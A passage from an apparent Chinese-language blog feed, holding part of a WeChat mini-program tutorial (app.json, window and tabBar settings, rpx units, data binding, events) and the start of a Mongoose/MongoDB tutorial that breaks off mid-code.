配置清单</strong></p><table><thead><tr><th>属性</th><th>类型</th><th>必填</th><th>描述</th></tr></thead><tbody><tr><td>pages</td><td>String Array</td><td>是</td><td>设置页面路径</td></tr><tr><td>window</td><td>Object</td><td>否</td><td>设置默认窗口表现</td></tr><tr><td>tabBar</td><td>Object</td><td>否</td><td>设置底部 tab 表现</td></tr><tr><td>networkTimeout</td><td>Object</td><td>否</td><td>设置网络超时时间</td></tr><tr><td>debug</td><td>Boolean</td><td>否</td><td>设置是否开启调试模式</td></tr></tbody></table><p>app.json 示例</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"pages"</span>:[</span><br><span class="line">    <span class="string">"pages/index/index"</span>,</span><br><span class="line">    <span class="string">"pages/detail/index"</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>window</strong></li></ol><p>对象类型，用于设置小程序的状态栏、导航条、标题、窗口背景色。</p><table><thead><tr><th>属性</th><th>类型</th><th>默认值</th><th>描述</th><th>兼容</th></tr></thead><tbody><tr><td>navigationBarBackgroundColor</td><td>HexColor</td><td>#000000</td><td>导航栏背景颜色，如”#000000”</td><td>-</td></tr><tr><td>navigationBarTextStyle</td><td>String</td><td>white</td><td>导航栏标题颜色，仅支持 black/white</td><td></td></tr><tr><td>navigationBarTitleText</td><td>String</td><td></td><td>导航栏标题文字内容</td><td></td></tr><tr><td>backgroundColor</td><td>HexColor</td><td>#ffffff</td><td>窗口的背景色</td></tr></tbody></table><p>查看window<a href="https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#window" target="_blank" rel="noopener">更多配置</a>属性</p><p>编辑 app.json，添加字段 windows</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"window"</span>: &#123;</span><br><span class="line">     <span class="attr">"navigationBarBackgroundColor"</span>: <span class="string">"#262626"</span>,</span><br><span class="line">     <span class="attr">"navigationBarTitleText"</span>: <span class="string">"XXX"</span>,</span><br><span class="line">     <span class="attr">"navigationBarTextStyle"</span>: <span class="string">"white"</span>,</span><br><span class="line">     <span class="attr">"backgroundColor"</span>: <span class="string">"#F0F0F0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>tabBar</strong></li></ol><p>对象类型，配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。</p><table><thead><tr><th>属性</th><th>类型</th><th>必填</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>color</td><td>HexColor</td><td>是</td><td></td><td>tab 上的文字默认颜色</td></tr><tr><td>selectedColor</td><td>HexColor</td><td>是</td><td></td><td>tab 上的文字选中时的颜色</td></tr><tr><td>backgroundColor</td><td>HexColor</td><td>是</td><td></td><td>tab 的背景色</td></tr><tr><td>borderStyle</td><td>String</td><td>否</td><td>black</td><td>tabbar上边框的颜色， 仅支持 black/white</td></tr><tr><td>list</td><td>Array</td><td>是</td><td></td><td>tab 的列表，最少2个、最多5个</td></tr><tr><td>position</td><td>String</td><td>否</td><td>bottom</td><td>可选值 bottom、top</td></tr></tbody></table><ol><li>当设置 position 为 top 时，将不会显示 icon</li><li>tabBar 中的 list 是一个数组，<strong>只能配置最少2个、最多5个 tab</strong>，tab 按数组的顺序排序。</li></ol><p>其中 list 接受一个数组，数组中的每个项都是一个对象，其属性值如下：</p><table><thead><tr><th>属性</th><th>类型</th><th>必填</th><th>描述</th></tr></thead><tbody><tr><td>pagePath</td><td>String</td><td>是</td><td>页面路径，必须在 pages 中先定义</td></tr><tr><td>text</td><td>String</td><td>是</td><td>tab 上按钮文字</td></tr><tr><td>iconPath</td><td>String</td><td>否</td><td>图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px，当 postion 为 top 时，此参数无效，不支持网络图片</td></tr><tr><td>selectedIconPath</td><td>String</td><td>否</td><td>选中时的图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px ，当 postion 为 top 时，此参数无效</td></tr></tbody></table><h3 id="2-2页面配置"><a href="#2-2页面配置" class="headerlink" title="2.2页面配置"></a>2.2页面配置</h3><blockquote><p>每个页面可以有不同的表现，通过 pages 目录下的 .json 文件，如 logs.json ，实现页面的局部配置。</p><p>但是只能设置 app.json 中的 window 配置项的内容，页面中配置项会覆盖 app.json 的 window 中相同的配置项。</p></blockquote><table><thead><tr><th>属性</th><th>类型</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>navigationBarBackgroundColor</td><td>HexColor</td><td>#000</td><td>导航栏背景颜色</td></tr><tr><td>navigationBarTextStyle</td><td>String</td><td>white</td><td>导航栏标题颜色，仅支持 black/white</td></tr><tr><td>navigationBarTitleText</td><td>String</td><td></td><td>导航栏标题文字内容</td></tr><tr><td>backgroundColor</td><td>HexColor</td><td>#fff</td><td>窗口的背景色</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 在 pages/center 目录下创建 index.json</span><br><span class="line">FC/pages/center</span><br><span class="line">├── index.js</span><br><span class="line">├── index.json</span><br><span class="line">└── index.wxml</span><br></pre></td></tr></table></figure><p>如下所示，编辑 index.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"navigationBarBackgroundColor"</span>: <span class="string">"#ffffff"</span>,</span><br><span class="line">  <span class="attr">"navigationBarTextStyle"</span>: <span class="string">"white"</span>,</span><br><span class="line">  <span class="attr">"navigationBarTitleText"</span>: <span class="string">"我的"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3适配、样式和组件"><a href="#2-3适配、样式和组件" class="headerlink" title="2.3适配、样式和组件"></a>2.3适配、样式和组件</h3><p><strong>一句话：开发小程序时所有屏幕宽度都是 750rpx。</strong></p><p><strong>rpx（responsive pixel）可以根据屏幕宽度进行自适应。规定所有屏幕宽为750rpx。</strong></p><p>rpx 与 px 的换算关系：</p><table><thead><tr><th>设备</th><th>屏幕尺寸</th><th>rpx换算px (屏幕宽度/750)</th><th>px换算rpx (750/屏幕宽度)</th></tr></thead><tbody><tr><td>iPhone5</td><td>320px</td><td>1rpx = 0.42px</td><td>1px = 2.34rpx</td></tr><tr><td>小米MIX 2S</td><td>360px</td><td>1rpx = 0.48px</td><td>1px = 2.083rpx</td></tr><tr><td>iPhone6</td><td>375px</td><td>1rpx = 0.5px</td><td>1px = 2rpx</td></tr><tr><td>iPhone6 Plus</td><td>414px</td><td>1rpx = 0.552px</td><td>1px = 1.81rpx</td></tr><tr><td>HUAWEI Mate 10</td><td>480px</td><td>1rpx = 0.64px</td><td>1px = 1.562rpx</td></tr></tbody></table><ul><li><p>样式导入</p><p>使用 @import 语句可以导入外联样式表， @import 后跟需要导入的外联样式表的相对路径，用 ; 表示语句结束。</p> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** common.wxss **/</span></span><br><span class="line"><span class="selector-tag">page</span> &#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#F0F0F0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** index.wxss **/</span></span><br><span class="line">@<span class="keyword">import</span> <span class="string">"common.wxss"</span>;</span><br><span class="line"><span class="selector-tag">page</span> &#123;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#F2F2F2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>内联样式</p></li><li><p>外部样式</p></li></ul><p><strong>image 相当于 html 中的 img 标签，用来加载图片。</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 通过 src 属性加载图片 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 通过 mode 属性调整 图片的的显示方式 (裁切/缩放) --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- image 组件默认宽度为300px，默认高度为225px --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">"../../static/uploads/item_1.png"</span> <span class="attr">mode</span>=<span class="string">"aspectFit"</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p>关于 <a href="https://developers.weixin.qq.com/miniprogram/dev/component/image.html" target="_blank" rel="noopener">mode 有效值</a></p><p><strong>text  相当于 html 中的 span，用来定义文本。</strong></p><p><strong>view 相当于 html 中的 div，一般做为容器出现。</strong></p><p><strong>swiper 滑块组件，可以用来实现类似轮播图布局效果。</strong></p><h2 id="3-基本语法"><a href="#3-基本语法" class="headerlink" title="3.基本语法"></a>3.基本语法</h2><h4 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定"></a>数据绑定</h4><p>类似<code>vue</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pages/demo/data.js</span></span><br><span class="line">Page(&#123;</span><br><span class="line">    <span class="comment">// 通过 data 属性，初始化页面中用到的数据</span></span><br><span class="line">    data: &#123;</span><br><span class="line">        message: <span class="string">'hello world!'</span></span><br><span class="line">        user: &#123;</span><br><span class="line">            name: <span class="string">'小明'</span>,</span><br><span class="line">            age: <span class="number">16</span></span><br><span class="line">        &#125;,</span><br><span class="line">        courses: [<span class="string">'wxml'</span>, <span class="string">'wxss'</span>, <span class="string">'javascript'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- pages/demo/data.wxml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">"msg"</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">  我叫&#123;&#123;user.name&#125;&#125;，</span><br><span class="line">  我今年&#123;&#123;user.age&#125;&#125;岁了，</span><br><span class="line">  我在学习&#123;&#123;courses[0]&#125;&#125;课程。</span><br><span class="line"><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="列表数据"><a href="#列表数据" class="headerlink" title="列表数据"></a>列表数据</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pages/demo/data.js</span></span><br><span class="line">Page(&#123;</span><br><span class="line">    <span class="comment">// 通过 data 属性，初始化页面中用到的数据</span></span><br><span class="line">    data: &#123;</span><br><span class="line">        brands: [</span><br><span class="line">            &#123;</span><br><span class="line">                name: <span class="string">'耐克'</span>,</span><br><span class="line">                origin: <span class="string">'美国'</span>,</span><br><span class="line">                category: [<span class="string">'男装'</span>, <span class="string">'女装'</span>, <span class="string">'鞋'</span>, <span class="string">'体育用品'</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                name: <span class="string">'SK-II'</span>,</span><br><span class="line">                origin: <span class="string">'韩国'</span>,</span><br><span class="line">                category: [<span class="string">'防晒霜'</span>,<span class="string">'面膜'</span>, <span class="string">'洗护'</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- pages/demo/data.wxml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">"&#123;&#123;brands&#125;&#125;"</span> <span class="attr">wx:for-index</span>=<span class="string">"k"</span> <span class="attr">wx:for-item</span>=<span class="string">"v"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span>&#123;&#123;k+1&#125;&#125; <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span> &#123;&#123;v.name&#125;&#125; <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span> &#123;&#123;v.origin&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span> <span class="attr">wx:for</span>=<span class="string">"&#123;&#123;v.category&#125;&#125;"</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>wx:for 属性将当前组件按着数组的长度动态创建，并且通过 index 变量可以访问到数组的索引值，通过item变量可以访问到单元值。</p><h4 id="block"><a href="#block" class="headerlink" title="block"></a>block</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- pages/demo/data.wxml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">"&#123;&#123;users&#125;&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>&#123;&#123;item.name&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>&#123;&#123;item.age&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="条件数据"><a href="#条件数据" class="headerlink" title="条件数据"></a>条件数据</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">"&#123;&#123;users&#125;&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span>&#123;&#123;index+1&#125;&#125; <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span> &#123;&#123;item.name&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span>&gt;</span> &#123;&#123;item.age&#125;&#125; <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">wx:if</span>=<span class="string">"&#123;&#123;item.age &lt;= 14&#125;&#125;"</span>&gt;</span> 儿童<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">wx:elif</span>=<span class="string">"&#123;&#123;item.age &lt;= 18&#125;&#125;"</span>&gt;</span> 未成年<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">wx:else</span>&gt;</span> 成年人<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Page(&#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">        users: [</span><br><span class="line">            &#123;<span class="attr">name</span>: <span class="string">'小明'</span>, <span class="attr">age</span>: <span class="number">18</span>&#125;,</span><br><span class="line">            &#123;<span class="attr">name</span>: <span class="string">'小红'</span>, <span class="attr">age</span>: <span class="number">13</span>&#125;,</span><br><span class="line">            &#123;<span class="attr">name</span>: <span class="string">'小丽'</span>, <span class="attr">age</span>: <span class="number">19</span>&#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="事件触发"><a href="#事件触发" class="headerlink" title="事件触发"></a>事件触发</h4><p><strong>语法格式： bind:事件名称=”回调函数”</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"primary"</span> <span class="attr">bind:tap</span>=<span class="string">"sayHi"</span>&gt;</span>点我试试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">bind:focus</span>=<span class="string">"sayHi"</span> <span class="attr">bind:blur</span>=<span class="string">"sayBye"</span> /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pages/demo/data.js</span></span><br><span class="line">Page(&#123;</span><br><span class="line">    sayHi: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Hi~'</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    sayHi: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Hi~'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    sayBye: <span class="function"><span class="keyword">function</span> (<span class="params">ev</span>) </span>&#123; <span class="comment">// ev  时间对象</span></span><br><span class="line">      <span class="built_in">console</span>.log(ev);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'Bye~'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="事件冒泡"><a href="#事件冒泡" class="headerlink" title="事件冒泡"></a>事件冒泡</h4><ul><li><p>子元素用bindtap绑定事件后，执行的时候，会冒泡到父元素（触发父亲元素上绑定的bindtap事件）</p></li><li><p>如果不想冒泡到父元素，可以用catchtap代替</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">botton</span> <span class="attr">catchtap</span>=<span class="string">"goDetail"</span>&gt;</span>catchtap<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">botton</span> <span class="attr">bindtap</span>=<span class="string">"goDetail"</span>&gt;</span>bindtap<span class="tag">&lt;/<span class="name">botton</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-生命周期"><a href="#4-生命周期" class="headerlink" title="4.生命周期"></a>4.生命周期</h2><p><img src="/view/posts/6316/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="微信小程序的生命周期" style="zoom:67%;"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-开发准备&quot;&gt;&lt;a href=&quot;#1-开发准备&quot; class=&quot;headerlink&quot; title=&quot;1.开发准备&quot;&gt;&lt;/a&gt;1.开发准备&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/cgi-bin/reg
      
    
    </summary>
    
      <category term="微信" scheme="http://yoursite.com/categories/%E5%BE%AE%E4%BF%A1/"/>
    
    
      <category term="微信小程序" scheme="http://yoursite.com/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>Mongoose</title>
    <link href="http://yoursite.com/posts/40119.html"/>
    <id>http://yoursite.com/posts/40119.html</id>
    <published>2020-06-18T07:20:24.000Z</published>
    <updated>2020-07-14T09:49:06.198Z</updated>
    
    <content type="html"><![CDATA[<p>Mongoose 是基于nodejs，使用javascript编程，连接mongodb数据库的软件包，使mongodb的文档数据模型变的优雅起来，方便对mongodb文档型数据库的连接和增删改查等常规数据操作。</p><p>mongoose是当前使用mean（mongodb express angularjs nodejs）全栈开发必用的连接数据库软件包。</p><p>参考资料：</p><p><a href="https://mlab.com/" target="_blank" rel="noopener">在线数据库</a></p><p><a href="http://www.mongoosejs.net/docs/guide.html" target="_blank" rel="noopener">mongoose guide</a></p><h2 id="后台与数据库交互"><a href="#后台与数据库交互" class="headerlink" title="后台与数据库交互"></a>后台与数据库交互</h2><ul><li>使用数据库的原生语言（例如 SQL）</li><li>使用对象数据模型（Object Data Model，简称 ODM）或对象关系模型（Object Relational Model，简称 ORM）。 ODM / ORM 能将网站中的数据表示为 JavaScript 对象，然后将它们映射到底层数据库。一些 ORM 只适用某些特定数据库，还有一些是普遍适用的。</li></ul><p>使用 SQL 或其它受到支持的查询语言才能达到最佳性能。</p><p>ODM 通常慢一些，因为在对象和数据库格式之间存在一层用于映射的翻译代码，使它不一定会选用最高性能的数据库查询（尤其是普遍使用级别的 ODM，它必须在各类数据库功能方面做出更大的折衷）。</p><p>使用 ORM 的好处是：程序员可以继续用 JavaScript 对象的思维而不用转向数据库语义的思维。 在（同一个或不同网站）使用不同数据库时尤为明显。使用 ORM 还可以更方便地对数据进行验证和检查。</p><h2 id="Mongoose"><a href="#Mongoose" class="headerlink" title="Mongoose"></a>Mongoose</h2><ul><li>Mongoose是在node.js异步环境下对mongodb进行便捷操作的对象模型工具</li></ul><p>Mongoose 的优点：</p><ul><li>可以为文档创建一个模式结构（Schema）</li><li>可以对模型中的对象/文档进行验证</li><li>数据可以通过类型转换为对象模型</li><li>可以使用中间件来应用业务逻辑挂钩</li><li>比 Node 原生的 MongoDB 驱动更容易<br>Mongoose 是最受欢迎的 ODM，选用 MongoDB 数据库时，它是一个合理的选择。</li></ul><p>新的对象：</p><ul><li>Schema（模式对象）<br>— Schema对象定义约束了数据库中的文档结构</li><li>Model<br>— Model对象作为集合中的所有文件的表示，相当于MondoDB数据库中的集合collection</li><li>Document<br>— Document 表示集合中的具体文档，相当于集合中的一个具体的文档</li></ul><h3 id="mongoose-连接数据库"><a href="#mongoose-连接数据库" class="headerlink" title="mongoose 连接数据库"></a>mongoose 连接数据库</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.下载 npm init -y &amp; npm i mongoose -S</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.引入 mongoose</span></span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">'mongoose'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.监听mongoDB数据库的连接状态</span></span><br><span class="line">mongoose.connection.once(<span class="string">'open'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'成功连接到 mongoDB 数据库'</span>)</span><br><span class="line">&#125;)</span><br><span class="line">mongoose.connection.once(<span class="string">'close'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'断开 mongoDB 数据库'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.连接数据库</span></span><br><span class="line"><span class="comment">// mongoose.connect('mongodb://数据库ip地址:端口号(默认：27017)/数据库名')</span></span><br><span class="line">mongoose.connect(</span><br><span class="line">  <span class="string">'mongodb://127.0.0.1/test'</span>,</span><br><span class="line">  &#123;</span><br><span class="line">    useNewUrlParser: <span class="literal">true</span>,</span><br><span class="line">    useUnifiedTopology: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  (err, db) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'连接数据库成功'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// mongoose 断开连接</span></span><br><span class="line"><span class="comment">// mongoose.disconnect()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个schema</span></span><br><span class="line"><span class="keyword">const</span> Schema = mongoose.Schema</span><br><span class="line"></span><br><span class="line"><span class="comment">// model模型</span></span><br><span class="line"><span class="keyword">const</span> stuSchema = <span class="keyword">new</span> Schema(&#123;</span><br><span class="line">  name: <span class="built_in">String</span>,</span><br><span class="line">  age: <span class="built_in">Number</span>,</span><br><span class="line">  gender: &#123;</span><br><span class="line">    type: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">default</span>: <span class="string">'female'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  address: <span class="built_in">String</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个 model -&gt; collection # mogoose.model(modelName, schema)</span></span><br><span class="line"><span class="keyword">const</span> StuModel = mongoose.model(<span class="string">'stus'</span>, stuSchema)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试：创建一个文档插入到数据库中</span></span><br><span class="line"><span class="comment">// StuModel.create(&#123;</span></span><br><span class="line"><span class="comment">//   name: 'houfei',</span></span><br><span class="line"><span class="comment">//   age: 25,</span></span><br><span class="line"><span class="comment">//   gender: 'male',</span></span><br><span class="line"><span class="comment">//   address: '河北'</span></span><br><span class="line"><span class="comment">// &#125;, err =&gt; &#123;</span></span><br><span class="line"><span class="comment">//   